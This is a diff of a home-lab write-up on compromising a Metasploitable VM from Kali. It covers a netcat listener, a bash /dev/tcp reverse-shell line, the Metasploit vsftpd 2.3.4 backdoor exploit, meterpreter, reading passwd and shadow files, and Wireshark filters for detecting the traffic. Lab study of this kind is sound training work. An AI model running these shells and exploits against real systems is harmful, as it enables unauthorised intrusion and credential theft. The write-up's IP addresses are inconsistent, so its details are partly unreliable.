@@ -211,6 +211,15 @@ On **Kali VM**, scan the target to discover the open ports and services:
 
 **-O**  --> *OS detection*
 
+![nmap-results](/screenshots/nmap1.png)
+
+![nmap-results](/screenshots/nmap2.png)
+
+![nmap-results](/screenshots/nmap3.png)
+
+![nmap-results](/screenshots/nmap4.png)
+
+
 **Findings:** VSFTPD 2.3.4 is flagged - the version has a famous backdoor (CVE-2011-2523).
 
 ### Step 2: Set Up the Netcat Listener (Attacker Side)
@@ -218,6 +227,7 @@ On **Kali VM**, scan the target to discover the open ports and services:
 On **Kali Linux**, open a terminal and start listening on port 4444:
 
 `nc -lvnp 4444`
+
 
 **Flag**      **Meaning**
 
@@ -228,6 +238,7 @@ On **Kali Linux**, open a terminal and start listening on port 4444:
 **-n**    -->  *No DNS resolution (faster)*
 
 **-p**    -->  *Specify the port*
+
 
 The terminal now waits for an incoming connection. This will be the 'catch' for the reverse shell.
 
@@ -244,6 +255,8 @@ This is for the demonstration of Netcat, from the **Metasploitable VM** (simulat
 **/dev/tcp/192.168.56.6/4444**  --> *Opens a TCP connection to attacker IP:port*
 
 **0>&1**  --> *Redirects stdin (keyboard input) to the same connection
+
+![metasploitable2-nc](/screenshots/Metasploitable2-nc)
 
 What happens is that **bash opens shell, then pipes all input/output over a network connection back to the attacker.**
 
@@ -268,6 +281,10 @@ hostname ----> metasploitable
 cat /etc/passwd  -----> view all users on target system
 uname -a -----> linux metasploitable 2.6.24-16-server
 ```
+
+![netcat-listener](/screenshots/nc1.png)
+
+![netcat-listener](/screenshots/nc2.png)
 
 ---
 
@@ -297,19 +314,17 @@ msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.6
 msf6 exploit(vsftpd_234_backdoor) > run
 
 ```
+![vsftpd](/screenshots/msf1.png)
+
 *Throught this the root access would have been acheived via a single CVE*
 
 - **Escalating to Meterpreter Shell**
+
 *A meterpreter shell guves us far more capabilities than a plain shell*
 
-*(run the commands step by step)*
-```
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
-msf6 > set LHOST 192.168.56.101
-msf6 > set LPORT 5555
-msf6 > run
-```
+![run & upgrade to meterpreter](/screenshots/msf6.png)
+
+
 - **These are the meterpreter capabilities used and what they do**
 
 ```
@@ -321,12 +336,24 @@ meterpreter > shell             # Drop into a system shell
 
 ```
 
+![meterpreter-capabilities](/screenshots/mptr1.png)
+
+![meterpreter-capabilities](/screenshots/mptr2.png)
+
+![meterpreter-shell](/screenshots/shl1.png)
+
+![shell-meterpreter](/screenshots/shm2.png)
+
+![cat-shadow](/screenshots/shad.png)
+
 ---
 ## Traffic Analysis with Wireshark
 
 **Capturing the Attack Traffic**
 
-Before starting any of the attacks, start wireshark  `sudo wireshark &`
+Before starting any of the attacks, start wireshark  `sudo wireshark`
+
+![wireshark](/screenshots/wshsto.png)
 
  - Select the active interface you use; example eth0, eth1
  - Start the capture
@@ -336,6 +363,8 @@ Before starting any of the attacks, start wireshark  `sudo wireshark &`
 1. **The TCP Handshake**
 
 The target initiates the connection to the attacker - this is the defining characteristic of a reverse shell.
+
+![captured-packets](/screenshots/wsharkpkts.png)
 
 2. **Shell Commands in Plaitext**
 
@@ -347,6 +376,11 @@ You'll then see the raw shell session:
 
 *Plain Netcat shells send all data unencrypted. Every command and response is visible in the packet capture.*
 
+![tcp-stream](/screenshots/wireshark1.png)
+
+![tcp-stream2](/screenshots/wshark3cat.png)
+
+![tcp-stream3](/screenshots/wireshark2.png)
 
 3. **Traffic Analysis Filters Used**
 
@@ -356,7 +390,9 @@ You'll then see the raw shell session:
    `tcp.stream eq 0`  --> Follow specific TCP stream
    `frame contains "bash"` --> Find the packets with shell strings
 
-4. **VSFTPd Backdoor Traffic**
+![another-filter](/screenshots/wsharkfinal.png)
+
+5. **VSFTPd Backdoor Traffic**
 
    Filter: `tcp.port == 21 or tcp.port == 6200`
 
